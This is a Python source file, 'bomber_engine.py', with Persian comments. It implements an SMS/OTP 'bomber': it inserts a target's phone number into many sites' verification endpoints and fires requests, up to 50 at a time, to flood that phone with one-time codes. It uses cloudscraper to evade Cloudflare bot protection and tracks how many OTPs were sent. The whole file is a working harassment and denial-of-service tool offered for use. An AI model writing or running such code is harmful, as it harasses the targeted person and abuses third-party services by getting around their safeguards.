# bomber_engine.py
import time
import cloudscraper
from datetime import datetime
from typing import Dict, List, Callable, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

class BomberEngine:
    def __init__(self):
        self.scraper = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
        )
        self.is_running = False
        self.results = []
        self.target_phone = ""
        self.max_workers = 50
    
    def _replace_phone(self, obj, phone: str):
        """جایگزینی شماره در payload و URL"""
        if isinstance(obj, str):
            return obj.replace("{phone}", phone)
        elif isinstance(obj, dict):
            return {k: self._replace_phone(v, phone) for k, v in obj.items()}
        elif isinstance(obj, list):
            return [self._replace_phone(i, phone) for i in obj]
        return obj
    
    def attack_site(self, site: Dict, phone: str, test_type: str = "without_zero") -> Dict:
        """ارسال درخواست به یک اندپوینت"""
        result = {
            'name': site.get('name', 'Unknown'),
            'url': site.get('url', ''),
            'phone': phone,
            'test_type': test_type,
            'status': 'unknown',
            'status_code': None,
            'error': None,
            'message': None,
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            headers = site.get('headers', {}).copy()
            
            if test_type == "with_zero":
                test_phone = "0" + phone
            else:
                test_phone = phone if not phone.startswith('0') else phone[1:]
            
            payload = self._replace_phone(site.get('payload', {}), test_phone)
            url = site['url'].replace("{phone}", test_phone)
            
            if site.get('method') == 'GET':
                response = self.scraper.get(url, params=payload, headers=headers, timeout=15)
            else:
                if site.get('type') == 'form':
                    response = self.scraper.post(url, data=payload, headers=headers, timeout=15)
                else:
                    response = self.scraper.post(url, json=payload, headers=headers, timeout=15)
            
            result['status_code'] = response.status_code
            result['status'] = 'success' if response.status_code < 400 else 'failed'
            
            try:
                resp_json = response.json()
                if resp_json.get('success') or resp_json.get('status') == 'success' or resp_json.get('result') == 'OK':
                    result['message'] = '✅ OTP sent!'
                elif resp_json.get('message'):
                    result['message'] = f"📩 {resp_json.get('message')}"
                else:
                    result['message'] = f'Response: {response.text[:80]}'
            except:
                text = response.text.lower()
                if 'success' in text or 'ok' in text or 'otp' in text:
                    result['message'] = '✅ Request sent!'
                elif 'already' in text or 'exist' in text:
                    result['message'] = '⚠️ Already registered'
                else:
                    result['message'] = f'Response: {response.text[:80]}'
            
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
        
        return result
    
    def run_bomb(self, endpoints: List[Dict], phone: str, callback: Callable = None, 
                 mode: str = "storm", on_complete: Callable = None) -> Dict:
        """
        اجرای حمله با اندپوینت‌های مشخص
        
        Args:
            endpoints: لیست اندپوینت‌ها
            phone: شماره هدف
            callback: تابع callback برای نمایش پیشرفت
            mode: حالت حمله (storm یا calm)
            on_complete: تابع پس از اتمام
        
        Returns:
            Dict: نتایج حمله
        """
        self.is_running = True
        self.results = []
        self.target_phone = phone
        
        variations = ["without_zero", "with_zero"]
        variation_names = ["بدون صفر", "با صفر"]
        
        total_endpoints = len(endpoints) * len(variations)
        processed = 0
        
        try:
            for var_idx, var_type in enumerate(variations):
                if not self.is_running:
                    break
                
                if callback:
                    callback("progress", f"📱 تست: {variation_names[var_idx]}")
                
                if mode == "storm":
                    # اجرای همزمان
                    with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                        future_to_site = {
                            executor.submit(self.attack_site, site, phone, var_type): site
                            for site in endpoints
                        }
                        
                        for future in as_completed(future_to_site):
                            if not self.is_running:
                                break
                            result = future.result()
                            self.results.append(result)
                            processed += 1
                            if callback:
                                callback("result", result)
                                callback("progress", f"پیشرفت: {processed}/{total_endpoints}")
                else:
                    # اجرای تکی
                    for site in endpoints:
                        if not self.is_running:
                            break
                        result = self.attack_site(site, phone, var_type)
                        self.results.append(result)
                        processed += 1
                        if callback:
                            callback("result", result)
                            callback("progress", f"پیشرفت: {processed}/{total_endpoints}")
                        time.sleep(0.5)  # تاخیر بین درخواست‌ها
                
                if callback:
                    callback("round_complete", f"✅ {variation_names[var_idx]} کامل شد")
        
        except Exception as e:
            if callback:
                callback("error", f"❌ خطا در حین اجرا: {e}")
        
        finally:
            self.is_running = False
            
            # محاسبه آمار
            success = [r for r in self.results if r['status'] == 'success']
            failed = [r for r in self.results if r['status'] == 'failed']
            errors = [r for r in self.results if r['status'] == 'error']
            
            result = {
                'total': len(self.results),
                'success': len(success),
                'failed': len(failed),
                'errors': len(errors),
                'results': self.results,
                'target_phone': phone
            }
            
            if on_complete:
                on_complete(result)
            
            return result
    
    def stop(self):
        """توقف حمله"""
        self.is_running = False